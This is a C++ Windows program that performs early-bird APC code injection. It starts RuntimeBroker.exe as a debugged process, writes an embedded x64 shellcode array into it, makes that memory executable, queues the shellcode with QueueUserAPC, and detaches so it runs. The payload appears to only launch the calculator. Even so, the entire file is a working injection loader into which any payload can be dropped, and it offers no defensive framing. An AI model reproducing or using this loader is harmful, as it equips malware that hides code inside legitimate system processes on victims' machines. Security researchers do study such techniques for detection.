#include <Windows.h>
#include <iostream>
#include <string>

#pragma warning(disable:4996)
#define TARGET_PROCESS "RuntimeBroker.exe"

using namespace std;

unsigned char Payload[] = {
    0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
    0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
    0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
    0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
    0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
    0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
    0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
    0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
    0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
    0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
    0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
    0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
    0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
    0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
    0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
    0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
    0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
    0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
    0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
    0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
    0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
    0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
    0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00
};

bool InjectShellcodeToRemoteProcess(HANDLE hProcess, PBYTE pShellcode, SIZE_T sSizeOfShellcode, PVOID* ppAddress) {
    SIZE_T sNumberOfBytesWritten = NULL;
    DWORD dwOldProtection = NULL;

    *ppAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (*ppAddress == NULL) {
        cerr << "\n\t[!] VirtualAllocEx Failed With Error : " << GetLastError() << " \n";
        return false;
    }
    cout << "\n\t[i] Allocated Memory At : 0x" << *ppAddress << " \n";

    cout << "\t[#] Press <Enter> To Write Payload ... ";
    cin.get();
    if (!WriteProcessMemory(hProcess, *ppAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {
        cerr << "\n\t[!] WriteProcessMemory Failed With Error : " << GetLastError() << " \n";
        return false;
    }
    cout << "\t[i] Successfully Written " << sNumberOfBytesWritten << " Bytes\n";

    if (!VirtualProtectEx(hProcess, *ppAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        cerr << "\n\t[!] VirtualProtectEx Failed With Error : " << GetLastError() << " \n";
        return false;
    }

    return true;
}

bool CreateSuspendedProcess2(LPCSTR lpProcessName, DWORD* dwProcessId, HANDLE* hProcess, HANDLE* hThread) {
    CHAR lpPath[MAX_PATH * 2];
    CHAR WnDr[MAX_PATH];

    STARTUPINFOA Si;
    PROCESS_INFORMATION Pi;

    ZeroMemory(&Si, sizeof(STARTUPINFO));
    ZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));

    Si.cb = sizeof(STARTUPINFO);

    if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) {
        cerr << "[!] GetEnvironmentVariableA Failed With Error : " << GetLastError() << " \n";
        return false;
    }

    sprintf(lpPath, "%s\\System32\\%s", WnDr, lpProcessName);
    cout << "\n\t[i] Running : \"" << lpPath << "\" ... ";

    if (!CreateProcessA(
        NULL,
        lpPath,
        NULL,
        NULL,
        FALSE,
        DEBUG_PROCESS,
        NULL,
        NULL,
        &Si,
        &Pi)) {
        cerr << "[!] CreateProcessA Failed with Error : " << GetLastError() << " \n";
        return false;
    }
    cout << "[+] DONE \n";

    *dwProcessId = Pi.dwProcessId;
    *hProcess = Pi.hProcess;
    *hThread = Pi.hThread;

    if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL)
        return true;

    return false;
}

int main() {
    HANDLE hProcess = NULL, hThread = NULL;
    DWORD dwProcessId = NULL;

    PVOID pAddress = NULL;

    cout << "[i] Creating \"" << TARGET_PROCESS << "\" Process As A Debugged Process ... ";
    if (!CreateSuspendedProcess2(TARGET_PROCESS, &dwProcessId, &hProcess, &hThread)) {
        return -1;
    }
    cout << "\t[i] Target Process Created With Pid : " << dwProcessId << " \n";
    cout << "[+] DONE \n\n";

    cout << "[i] Writing Shellcode To The Target Process ... ";

    if (!InjectShellcodeToRemoteProcess(hProcess, Payload, sizeof(Payload), &pAddress)) {
        return -1;
    }
    cout << "[+] DONE \n\n";

    if (QueueUserAPC((PAPCFUNC)pAddress, hThread, NULL) == 0) {
        cerr << "[!] QueueUserAPC Failed With Error : " << GetLastError() << " \n";
        return -1;
    }

    cout << "[#] Press <Enter> To Run Shellcode ... ";
    cin.get();

    cout << "[i] Detaching The Target Process ... ";
    DebugActiveProcessStop(dwProcessId);
    cout << "[+] DONE \n\n";

    cout << "[#] Press <Enter> To Quit ... ";
    cin.get();
    CloseHandle(hThread);
    CloseHandle(hProcess);

    return 0;
}
